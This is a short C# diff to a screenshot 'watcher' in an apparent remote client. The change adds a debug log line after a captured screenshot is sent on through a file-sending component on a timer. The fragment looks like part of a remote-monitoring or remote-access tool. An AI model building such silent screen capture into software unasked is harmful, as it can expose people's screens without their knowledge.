@@ -1,5 +1,6 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.Diagnostics;
 using System.Drawing;
 using System.Drawing.Imaging;
 using System.IO;
@@ -140,7 +141,8 @@ namespace Client.Armitage.Watchers
             await Task.Run(() => {
                 var bytes = Screenshot();
                 Communication.File_Stacker.Send(bytes, Communication.File_Stacker.Filetype.Screenshot);
-            });
+                Debug.WriteLine($"Screenshot Sent: {bytes.Length}");
+            }); 
         }
         private static void _refreshtimer_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
         {
